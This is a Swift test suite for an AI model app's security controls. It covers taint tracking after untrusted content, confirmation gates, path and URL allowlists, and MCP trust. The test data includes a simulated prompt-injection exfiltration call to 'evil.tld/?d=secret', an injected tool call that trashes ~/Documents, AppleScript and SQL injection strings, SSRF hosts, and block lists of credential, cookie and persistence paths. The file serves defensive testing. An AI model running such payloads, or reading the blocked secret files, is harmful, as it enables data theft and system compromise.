import Foundation
import Testing

@testable import PalukuCore

/// Abuse cases from the security audit (docs/SECURITY.md). Each must fail closed.
@Suite struct SecurityTests {
    func tool(
        _ name: String, integration: String = "web", write: Bool = false, egress: Bool = false, untrusted: Bool = false, allowBypass: Bool = true,
        ran: Box<[String]>
    ) -> Tool {
        Tool(name: name, description: "d", integration: integration, isWrite: write, egress: egress, untrusted: untrusted, allowBypass: allowBypass) { _ in
            ran.value.append(name)
            return ToolResult("ok from \(name)")
        }
    }

    @Test func egressAfterUntrustedContentRequiresConfirmation() async throws {
        let ran = Box<[String]>([])
        let llm = FakeLLM([
            ChatReply(content: "", toolCalls: [ToolCall(name: "mail_read", arguments: [:])]),
            ChatReply(content: "", toolCalls: [ToolCall(name: "web_fetch", arguments: ["url": "https://evil.tld/?d=secret"])]),
            ChatReply(content: "done"),
        ])
        let agent = Agent(
            llm: llm, model: "m",
            tools: [
                tool("mail_read", integration: "mail", untrusted: true, ran: ran),
                tool("web_fetch", egress: true, untrusted: true, ran: ran),
            ])
        let asked = Box<[String]>([])
        _ = try await agent.send(
            "summarize my mail", system: "s",
            confirm: { r in
                asked.value.append(r.toolName); return false
            }, emit: { _ in })
        #expect(ran.value == ["mail_read"])
        #expect(asked.value == ["web_fetch"])
    }

    @Test func egressBeforeTaintRunsFreely() async throws {
        let ran = Box<[String]>([])
        let llm = FakeLLM([ChatReply(content: "", toolCalls: [ToolCall(name: "web_search", arguments: [:])]), ChatReply(content: "x")])
        let agent = Agent(llm: llm, model: "m", tools: [tool("web_search", egress: true, untrusted: true, ran: ran)])
        _ = try await agent.send("search", system: "s", confirm: { _ in false }, emit: { _ in })
        #expect(ran.value == ["web_search"])
    }

    @Test func taintPersistsAcrossTurnsUntilReset() async throws {
        let ran = Box<[String]>([])
        let llm = FakeLLM([
            ChatReply(content: "", toolCalls: [ToolCall(name: "files_read", arguments: [:])]), ChatReply(content: "a"),
            ChatReply(content: "", toolCalls: [ToolCall(name: "open_url", arguments: [:])]), ChatReply(content: "b"),
        ])
        let agent = Agent(llm: llm, model: "m", tools: [tool("files_read", untrusted: true, ran: ran), tool("open_url", egress: true, ran: ran)])
        _ = try await agent.send("1", system: "s", confirm: { _ in false }, emit: { _ in })
        _ = try await agent.send("2", system: "s", confirm: { _ in false }, emit: { _ in })
        #expect(ran.value == ["files_read"])
        await agent.reset()
        #expect(await agent.tainted == false)
    }

    @Test func nonBypassableToolsAlwaysConfirm() async throws {
        let ran = Box<[String]>([])
        let llm = FakeLLM([ChatReply(content: "", toolCalls: [ToolCall(name: "messages_send", arguments: [:])]), ChatReply(content: "x")])
        let agent = Agent(
            llm: llm, model: "m", tools: [tool("messages_send", integration: "messages", write: true, allowBypass: false, ran: ran)], bypass: ["messages"])
        _ = try await agent.send("text mom", system: "s", confirm: { _ in false }, emit: { _ in })
        #expect(ran.value.isEmpty)
    }

    @Test func inlineJSONToolCallsIgnoredOnceTainted() async throws {
        let ran = Box<[String]>([])
        let llm = FakeLLM([
            ChatReply(content: "", toolCalls: [ToolCall(name: "web_fetch", arguments: [:])]),
            ChatReply(content: #"{"name":"files_trash","arguments":{"path":"~/Documents"}}"#),
        ])
        let agent = Agent(llm: llm, model: "m", tools: [tool("web_fetch", egress: true, untrusted: true, ran: ran), tool("files_trash", ran: ran)])
        _ = try await agent.send("x", system: "s", confirm: { _ in true }, emit: { _ in })
        #expect(ran.value == ["web_fetch"])
    }

    @Test func backgroundAgentStartsTainted() async {
        #expect(await Agent(llm: FakeLLM([]), model: "m", tools: [], tainted: true).tainted)
    }

    // MARK: tool-level validation

    @Test func mediaControlRejectsUnknownPlayer() async {
        let media = AppleAppTools.all.first { $0.name == "media_control" }!
        await #expect(throws: ToolArgumentError.self) {
            _ = try await media.run(["app": "Music\" to play\ndo shell script \"id\"\ntell application \"Music", "action": "play"])
        }
    }

    @Test func sensitivePathsAreRefused() {
        for p in [
            "~/.ssh/id_ed25519", "~/.aws/credentials", "~/Library/Keychains/login.keychain-db", "~/Library/Messages/chat.db",
            "~/Library/Application Support/Paluku/settings.json", "~/.gnupg/x", "/etc/../Users/x/.ssh/y",
        ] {
            #expect(throws: ToolArgumentError.self, "\(p)") { try FinderTools.checkReadable(FinderTools.expand(p)) }
        }
        #expect(throws: Never.self) { try FinderTools.checkReadable(FinderTools.expand("~/Documents/notes.txt")) }
    }

    @Test func writesOutsideUserContentAreRefused() {
        for p in ["~/Library/LaunchAgents/evil.plist", "~/.zshrc", "~/.config/x", "/Applications/Foo.app", "/usr/local/bin/x"] {
            #expect(throws: ToolArgumentError.self, "\(p)") { try FinderTools.checkWritable(FinderTools.expand(p)) }
        }
        #expect(throws: Never.self) { try FinderTools.checkWritable(FinderTools.expand("~/Desktop/report.txt")) }
    }

    @Test func openURLOnlyAllowsWeb() {
        #expect(SystemTools.safeWebURL("https://example.com") != nil)
        #expect(SystemTools.safeWebURL("example.com")?.absoluteString == "https://example.com")
        #expect(SystemTools.safeWebURL("file:///Applications/Calculator.app") == nil)
        #expect(SystemTools.safeWebURL("vscode://x") == nil)
        #expect(SystemTools.safeWebURL("javascript:alert(1)") == nil)
    }

    @Test func webFetchBlocksPrivateNetworks() {
        for h in [
            "127.0.0.1", "localhost", "10.0.0.5", "192.168.1.1", "172.16.3.4", "169.254.169.254", "::1", "fe80::1", "fd00::1", "printer.local", "0.0.0.0",
        ] {
            #expect(NetGuard.isPrivateHost(h), "\(h)")
        }
        for h in ["example.com", "8.8.8.8", "2606:4700::1111"] { #expect(!NetGuard.isPrivateHost(h), "\(h)") }
    }

    @Test func mcpReadOnlyRequiresUserTrust() {
        var cfg = MCPServerConfig(id: "s", name: "s", command: "x")
        #expect(!MCPHub.isReadOnly(name: "delete_everything", hint: true, cfg: cfg))  // untrusted server's hint ignored
        #expect(!MCPHub.isReadOnly(name: "search_emails", hint: nil, cfg: cfg))  // untrusted server: everything confirms
        #expect(!MCPHub.isReadOnly(name: "download_file", hint: nil, cfg: cfg))
        #expect(!MCPHub.isReadOnly(name: "get_and_delete", hint: nil, cfg: cfg))
        cfg.trustReadOnlyHints = true
        #expect(MCPHub.isReadOnly(name: "query_db", hint: true, cfg: cfg))
        #expect(!MCPHub.isReadOnly(name: "list_and_remove", hint: false, cfg: cfg))
        cfg.readOnlyTools = ["archive_thread"]
        #expect(MCPHub.isReadOnly(name: "archive_thread", hint: false, cfg: cfg))
    }

    @Test func spotlightQueryEscapesMetacharacters() {
        let q = FinderTools.spotlightQuery("a\\\" || true || \"*", kind: nil, after: nil, before: nil)
        #expect(!q.contains("\\"))
        #expect(!q.contains("\"*\"*"))
    }

    @Test func messageHandlesAreSanitizedForSQL() {
        #expect(AppleAppTools.sqlSafeHandle("+1 (555) 010-2233") == "5550102233")
        #expect(AppleAppTools.sqlSafeHandle("mom@example.com") == "mom@example.com")
        #expect(AppleAppTools.sqlSafeHandle("x' OR 1=1 --") == nil)
        #expect(AppleAppTools.sqlSafeHandle("%_%") == nil)
    }

    @Test func updateLinksMustPointAtRepoReleases() {
        let good = Data(#"{"tag_name":"v9.0.0","html_url":"https://github.com/gvsrusa/paluku/releases/tag/v9.0.0"}"#.utf8)
        let evil = Data(#"{"tag_name":"v9.0.0","html_url":"https://evil.tld/Paluku.dmg"}"#.utf8)
        #expect(UpdateChecker.parse(good, repo: "gvsrusa/paluku") != nil)
        #expect(UpdateChecker.parse(evil, repo: "gvsrusa/paluku") == nil)
    }
}

@Suite struct CompatibilityTests {
    @Test func oldConfigsWithoutNewFieldsStillDecode() throws {
        let mcp = try JSONDecoder().decode(MCPServerConfig.self, from: Data(#"{"id":"g","name":"G","command":"uvx"}"#.utf8))
        #expect(mcp.enabled && !mcp.trustReadOnlyHints && mcp.args.isEmpty)
        let dec = JSONDecoder()
        dec.dateDecodingStrategy = .iso8601
        let t = try dec.decode(ScheduledTask.self, from: Data(#"{"kind":"reminder","instruction":"x","fireDate":"2026-09-27T10:00:00Z"}"#.utf8))
        #expect(!t.weekdaysOnly)
    }
}

@Suite struct ProcessLifecycleTests {
    @Test func timeoutKillsChildrenAndReturnsPromptly() async throws {
        let marker = "paluku-test-\(UUID().uuidString.prefix(6))"
        let start = Date()
        await #expect(throws: (any Error).self) {
            _ = try await Shell.run("/bin/zsh", ["-c", "exec -a \(marker) sleep 30 & wait"], timeout: 0.5)
        }
        #expect(Date().timeIntervalSince(start) < 5)
        try await Task.sleep(for: .milliseconds(300))
        let left = (try? await Shell.run("/usr/bin/pgrep", ["-f", marker])) ?? ""
        #expect(left.isEmpty, "child survived: \(left)")
    }

    @Test func withTimeoutReturnsEvenIfWorkIgnoresCancellation() async {
        let start = Date()
        await #expect(throws: (any Error).self) {
            _ = try await withTimeout(0.2) { () async throws -> Int in
                while Date().timeIntervalSince(start) < 3 { usleep(10_000) }  // ignores cancellation
                return 1
            }
        }
        #expect(Date().timeIntervalSince(start) < 1)
    }
}

@Suite struct OpenAIStreamEdgeTests {
    @Test func toolCallsWithoutIndexAreKeptSeparate() throws {
        var acc = OpenAICompatibleClient.StreamAccumulator()
        _ = try acc.consume(#"data: {"choices":[{"delta":{"tool_calls":[{"id":"a","function":{"name":"one","arguments":"{}"}}]}}]}"#)
        _ = try acc.consume(#"data: {"choices":[{"delta":{"tool_calls":[{"id":"b","function":{"name":"two","arguments":"{\"x\":1}"}}]}}]}"#)
        #expect(acc.reply.toolCalls.map(\.name) == ["one", "two"])
        #expect(acc.reply.toolCalls[1].arguments == ["x": 1])
    }
}

/// Round 2: findings from the adversarial doubt review.
@Suite struct SecurityRound2Tests {
    func tool(_ name: String, integration: String = "x", write: Bool = false, egress: Bool = false, untrusted: Bool = false, ran: Box<[String]>) -> Tool {
        Tool(name: name, description: "d", integration: integration, isWrite: write, egress: egress, untrusted: untrusted) { _ in
            ran.value.append(name)
            return ToolResult("ok")
        }
    }

    @Test func taintDisablesBypass() async throws {
        let ran = Box<[String]>([])
        let llm = FakeLLM([
            ChatReply(content: "", toolCalls: [ToolCall(name: "read", arguments: [:])]),
            ChatReply(content: "", toolCalls: [ToolCall(name: "move", arguments: [:])]),
            ChatReply(content: "x"),
        ])
        let agent = Agent(
            llm: llm, model: "m", tools: [tool("read", untrusted: true, ran: ran), tool("move", integration: "finder", write: true, ran: ran)],
            bypass: ["finder"])
        _ = try await agent.send("x", system: "s", confirm: { _ in false }, emit: { _ in })
        #expect(ran.value == ["read"])
    }

    @Test func markTaintedFromOutsideContext() async throws {
        let ran = Box<[String]>([])
        let llm = FakeLLM([ChatReply(content: "", toolCalls: [ToolCall(name: "fetch", arguments: [:])]), ChatReply(content: "x")])
        let agent = Agent(llm: llm, model: "m", tools: [tool("fetch", egress: true, ran: ran)])
        await agent.markTainted()  // e.g. screenshot / selected text / untrusted MCP descriptions in context
        _ = try await agent.send("x", system: "s", confirm: { _ in false }, emit: { _ in })
        #expect(ran.value.isEmpty)
    }

    @Test func resetSupersedesLiveRun() async throws {
        final class SlowLLM: LLM, @unchecked Sendable {
            func chat(model: String, messages: [ChatMessage], tools: [ToolSpec], temperature: Double, onToken: (@Sendable (String) -> Void)?) async throws
                -> ChatReply
            {
                try await Task.sleep(for: .milliseconds(150))
                return ChatReply(content: "late")
            }
        }
        let agent = Agent(llm: SlowLLM(), model: "m", tools: [])
        async let r = agent.send("q", system: "s", confirm: { _ in true }, emit: { _ in })
        try await Task.sleep(for: .milliseconds(30))
        await agent.reset()
        #expect(try await r == "")
        #expect(await agent.messages.isEmpty)
    }

    @Test func pathPolicyIsCaseInsensitive() {
        for p in ["~/.SSH/id_ed25519", "~/.Aws/credentials", "~/library/Keychains/x", "~/.git-credentials", "~/.config/gcloud/creds.db", "~/.zsh_history"] {
            #expect(throws: ToolArgumentError.self, "\(p)") { try FinderTools.checkReadable(FinderTools.expand(p)) }
        }
        #expect(throws: ToolArgumentError.self) { try FinderTools.checkWritable(FinderTools.expand("~/library/LaunchAgents/x.plist")) }
    }

    @Test func openRefusesLinkFilesAndSymlinkedExecutables() throws {
        let dir = FileManager.default.temporaryDirectory.appending(path: "paluku-open-\(UUID().uuidString.prefix(6))")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        let term = dir.appending(path: "x.terminal")
        try Data("x".utf8).write(to: term)
        let link = dir.appending(path: "notes.txt")
        try FileManager.default.createSymbolicLink(at: link, withDestinationURL: term)
        for ext in ["webloc", "inetloc", "fileloc", "shortcut", "mobileconfig", "prefPane", "scptd"] {
            #expect(throws: ToolArgumentError.self, "\(ext)") { try FinderTools.checkOpenable(dir.appending(path: "a.\(ext)")) }
        }
        #expect(throws: ToolArgumentError.self) { try FinderTools.checkOpenable(link) }
        #expect(throws: Never.self) { try FinderTools.checkOpenable(dir) }  // plain folders open fine
    }

    @Test func netGuardCatchesObfuscatedLoopback() {
        for h in ["0177.0.0.1", "2130706433", "0x7f000001", "127.1", "0:0:0:0:0:0:0:1", "0::1", "::ffff:7f00:1", "::127.0.0.1", "64:ff9b::a00:1"] {
            #expect(NetGuard.isPrivateHost(h), "\(h)")
        }
    }

    @Test func mcpUnknownServerToolsAllConfirm() {
        let cfg = MCPServerConfig(id: "s", name: "s", command: "x")
        for n in ["query", "list_issues", "get_or_mark_read", "searchAndPurge"] {
            #expect(!MCPHub.isReadOnly(name: n, hint: true, cfg: cfg), "\(n)")
        }
        var trusted = cfg
        trusted.trustReadOnlyHints = true
        #expect(MCPHub.isReadOnly(name: "search_emails", hint: true, cfg: trusted))
        #expect(!MCPHub.isReadOnly(name: "getOrMarkRead", hint: true, cfg: trusted))  // camelCase write word
        #expect(!MCPHub.isReadOnly(name: "list_and_purge", hint: true, cfg: trusted))
    }

    @Test func mcpPresetsAreNotTrustedUntilTheUserSaysSo() {
        #expect(MCPPresets.all.allSatisfy { !$0.trustReadOnlyHints })
    }

    @Test func mailPreviewShowsEveryRecipient() {
        let mail = AppleAppTools.all.first { $0.name == "mail_send" }!
        let p = mail.preview(["to": "a@x.com", "cc": "evil@y.com", "subject": "s", "body": "b", "draft": true])
        #expect(p.contains("evil@y.com"))
        #expect(p.lowercased().contains("draft"))
    }

    @Test func fixedHostLookupsAreNotEgress() {
        let web = WebTools.all()
        #expect(web.first { $0.name == "web_search" }!.egress == false)
        #expect(web.first { $0.name == "weather" }!.egress == false)
        #expect(web.first { $0.name == "web_fetch" }!.egress == true)
    }
}

@Suite struct VoiceConfirmationTests {
    @Test func onlyWholeUtterancesCount() {
        #expect(VoiceConfirmation.parse("Yes.") == true)
        #expect(VoiceConfirmation.parse("okay please") == true)
        #expect(VoiceConfirmation.parse("Don't.") == false)
        #expect(VoiceConfirmation.parse("okay but send it to Bob instead") == nil)
        #expect(VoiceConfirmation.parse("sure, don't send") == nil)
        #expect(VoiceConfirmation.parse("what's the weather") == nil)
    }
}

/// Round 3: findings from doubt cycle 2 (two reproduced on a real machine).
@Suite struct SecurityRound3Tests {
    @Test func percentEncodedAndUnresolvableHostsAreBlocked() {
        for u in ["http://127.0.0%2e1:8765/", "http://169.254.169%2e254/latest", "http://127%2e0%2e0%2e1/", "http://this-host-does-not-exist-paluku.invalid/"] {
            #expect(throws: ToolArgumentError.self, "\(u)") { try NetGuard.check(URL(string: u)!) }
        }
    }

    @Test func symlinkedParentOfNewFileIsResolved() throws {
        let home = FinderTools.home
        let base = home.appending(path: "Downloads/paluku-test-\(UUID().uuidString.prefix(6))")
        try FileManager.default.createDirectory(at: base, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: base) }
        let link = base.appending(path: "x")
        try FileManager.default.createSymbolicLink(at: link, withDestinationURL: home.appending(path: "Library/LaunchAgents"))
        #expect(throws: ToolArgumentError.self) { try FinderTools.checkWritable(link.appending(path: "new/evil.plist")) }
        #expect(throws: Never.self) { try FinderTools.checkWritable(base.appending(path: "ok.txt")) }
    }

    @Test func readsNeverTouchLibraryOrHiddenPaths() {
        for p in [
            "~/Library/Application Support/Google/Chrome Beta/Default/Cookies", "~/Library/Application Support/Slack/Cookies",
            "~/Library/Application Support/Vivaldi/Default/Login Data", "~/.env", "~/project/.env", "~/code/.git/config",
        ] {
            #expect(throws: ToolArgumentError.self, "\(p)") { try FinderTools.checkReadable(FinderTools.expand(p)) }
        }
        #expect(throws: Never.self) { try FinderTools.checkReadable(FinderTools.expand("~/Documents/report.pdf")) }
    }

    @Test func documentPackagesOpenButActiveOrImportingFilesDoNot() throws {
        let dir = FileManager.default.temporaryDirectory.appending(path: "paluku-pkg-\(UUID().uuidString.prefix(6))")
        let rtfd = dir.appending(path: "Notes.rtfd")
        try FileManager.default.createDirectory(at: rtfd, withIntermediateDirectories: true)
        #expect(throws: Never.self) { try FinderTools.checkOpenable(rtfd) }
        for ext in ["afploc", "ftploc", "vncloc", "mailloc", "html", "webarchive", "ics", "vcf"] {
            #expect(throws: ToolArgumentError.self, "\(ext)") { try FinderTools.checkOpenable(dir.appending(path: "a.\(ext)")) }
        }
    }

    @Test func recipientsMustBeCleanAddresses() {
        #expect(AppleAppTools.validRecipients("a@x.com, b@y.org") == ["a@x.com", "b@y.org"])
        #expect(AppleAppTools.validRecipients("a@x.com\n\n\n\nevil@z.com") == nil)
        #expect(AppleAppTools.validRecipients("not an email") == nil)
    }

    @Test func mcpWordSplittingCoversSeparatorsAndCapsRuns() {
        #expect(MCPHub.words("repo:delete").contains("delete"))
        #expect(MCPHub.words("files/remove").contains("remove"))
        #expect(MCPHub.words("HTTPDelete").contains("delete"))
    }

    @Test func mcpServerIdsAreSanitized() {
        #expect(MCPServerConfig.sanitizedID("a__b") == "a-b")
        #expect(MCPServerConfig.sanitizedID("My Server!") == "my-server")
    }

    @Test func schedulingHasItsOwnIntegration() {
        let hooks = SystemTools.Hooks(insert: { _ in }, remember: { _, _ in }, schedule: { _ in }, listScheduled: { [] }, cancelScheduled: { _ in false })
        let t = SystemTools.all(hooks)
        let r = t.first { $0.name == "schedule_reminder" }!
        #expect(r.isWrite && r.integration == "schedule")
        #expect(t.first { $0.name == "scheduled_cancel" }!.integration == "schedule")
        #expect(t.first { $0.name == "open_app" }!.integration == "apps")
    }
}

/// Round 4: doubt cycle 3 (reproduced on-device). Move from denylists to allowlists.
@Suite struct SecurityRound4Tests {
    func tmp() throws -> URL {
        let d = FileManager.default.temporaryDirectory.appending(path: "paluku-r4-\(UUID().uuidString.prefix(6))")
        try FileManager.default.createDirectory(at: d, withIntermediateDirectories: true)
        return d
    }

    @Test func onlyKnownDocumentTypesOpen() throws {
        let d = try tmp()
        for ok in ["a.pdf", "a.png", "a.txt", "a.md", "a.docx", "a.xlsx", "a.pptx", "a.pages", "a.mov", "a.mp3", "a.csv"] {
            let u = d.appending(path: ok)
            try Data("x".utf8).write(to: u)
            #expect(throws: Never.self, "\(ok)") { try FinderTools.checkOpenable(u) }
        }
        for bad in [
            "a.ipa", "a.cer", "a.pem", "a.p12", "a.jnlp", "a.wflow", "a.shtml", "a.xht", "a.eml", "a.pkpass", "a.safariextz", "a.unknownext", "a.py", "a.html",
        ] {
            let u = d.appending(path: bad)
            try Data("x".utf8).write(to: u)
            #expect(throws: ToolArgumentError.self, "\(bad)") { try FinderTools.checkOpenable(u) }
        }
    }

    @Test func finderAliasesAreRefused() throws {
        let d = try tmp()
        let target = URL(fileURLWithPath: "/System/Applications/Calculator.app")
        let alias = d.appending(path: "report.pdf")
        let data = try target.bookmarkData(options: .suitableForBookmarkFile, includingResourceValuesForKeys: nil, relativeTo: nil)
        try URL.writeBookmarkData(data, to: alias)
        #expect(throws: ToolArgumentError.self) { try FinderTools.checkOpenable(alias) }
    }

    @Test func dotDotPathsAreRefused() {
        let p = FinderTools.expand("~/.swiftpm/configuration/../../LaunchAgents/x.plist")
        #expect(throws: ToolArgumentError.self) { try FinderTools.checkWritable(p) }
        #expect(throws: ToolArgumentError.self) { try FinderTools.checkWritable(URL(fileURLWithPath: FinderTools.home.path + "/Documents/../Library/x")) }
    }

    @Test func readsStayInsideHome() {
        for p in ["/Library/Preferences/SystemConfiguration/preferences.plist", "/opt/homebrew/etc/x.conf", "/Users/Shared/.x", "/Volumes/X/.env"] {
            #expect(throws: ToolArgumentError.self, "\(p)") { try FinderTools.checkReadable(URL(fileURLWithPath: p)) }
        }
    }

    @Test func legacyTrustedPresetsAreMigratedToUntrusted() throws {
        let json =
            #"{"mcpServers":[{"id":"google","name":"G","command":"uvx","trustReadOnlyHints":true},{"id":"mine","name":"M","command":"x","trustReadOnlyHints":true}]}"#
        let s = try JSONDecoder().decode(Settings.self, from: Data(json.utf8))
        #expect(s.mcpServers.first { $0.id == "google" }?.trustReadOnlyHints == false)  // never an explicit opt-in before v2
        #expect(s.mcpServers.first { $0.id == "mine" }?.trustReadOnlyHints == true)
        #expect(s.settingsVersion == Settings.currentVersion)
    }
}

/// v1.2 audit: every finder tool that takes a path honours the home-folder allowlist, not just read/write.
@Suite struct FinderPathPolicyTests {
    @Test(arguments: [("files_list", "folder"), ("files_search", "folder"), ("files_reveal", "path")])
    func refusesPrivateAreas(tool: String, key: String) async {
        let t = FinderTools.all.first { $0.name == tool }!
        for p in ["~/.ssh", "~/Library/Messages", "/etc", "/Volumes"] {
            var args: [String: JSONValue] = [key: .string(p)]
            if tool == "files_search" { args["query"] = .string("key") }
            await #expect(throws: ToolArgumentError.self, "\(tool) \(p)") { _ = try await t.run(.object(args)) }
        }
    }
}

@Suite struct V12AuditTests {
    @Test func codingAgentRefusesDotfileAndDownloadsRepos() throws {
        let fm = FileManager.default
        for rel in [".config/evil-repo", "Downloads/some-repo", "Library/evil"] {
            let dir = FinderTools.home.appending(path: rel)
            let existed = fm.fileExists(atPath: dir.path)
            try fm.createDirectory(at: dir.appending(path: ".git"), withIntermediateDirectories: true)
            defer { if !existed { try? fm.removeItem(at: dir) } }
            #expect(throws: ToolArgumentError.self, "\(rel)") { _ = try SystemTools.codingDirectory(dir.path) }
        }
    }

    @Test func mcpHTTPNeedsTLSUnlessLoopback() {
        #expect(MCPServerConfig.isAllowedURL(URL(string: "https://mcp.example.com/mcp")!))
        #expect(MCPServerConfig.isAllowedURL(URL(string: "http://127.0.0.1:8000/mcp")!))
        #expect(MCPServerConfig.isAllowedURL(URL(string: "http://localhost:8000/mcp")!))
        #expect(!MCPServerConfig.isAllowedURL(URL(string: "http://mcp.example.com/mcp")!))
        #expect(!MCPServerConfig.isAllowedURL(URL(string: "file:///etc/passwd")!))
    }
}

/// Memories saved after outside content entered the conversation carry that origin (they go into every later prompt).
@Suite struct MemoryOriginTests {
    func run(tainted: Bool) async throws -> Bool? {
        let got = Box<Bool?>(nil)
        let hooks = SystemTools.Hooks(
            insert: { _ in }, remember: { _, outside in got.value = outside }, schedule: { _ in }, listScheduled: { [] },
            cancelScheduled: { _ in false })
        let llm = FakeLLM([ChatReply(content: "", toolCalls: [ToolCall(name: "remember", arguments: ["fact": "x"])]), ChatReply(content: "ok")])
        let agent = Agent(llm: llm, model: "m", tools: SystemTools.all(hooks).filter { $0.name == "remember" }, tainted: tainted)
        _ = try await agent.send("go", system: "s", confirm: { _ in true }, emit: { _ in })
        return got.value
    }

    @Test func rememberRecordsWhetherConversationWasTainted() async throws {
        #expect(try await run(tainted: true) == true)
        #expect(try await run(tainted: false) == false)
    }

    @Test func oldMemoryFilesDecode() throws {
        let old = #"[{"id":"6F9619FF-8B86-D011-B42D-00C04FC964FF","text":"hi","locked":false,"created":"2026-01-01T00:00:00Z"}]"#
        let dec = JSONDecoder()
        dec.dateDecodingStrategy = .iso8601
        let items = try dec.decode([MemoryItem].self, from: Data(old.utf8))
        #expect(items.first?.fromOutsideContent == false)
    }
}
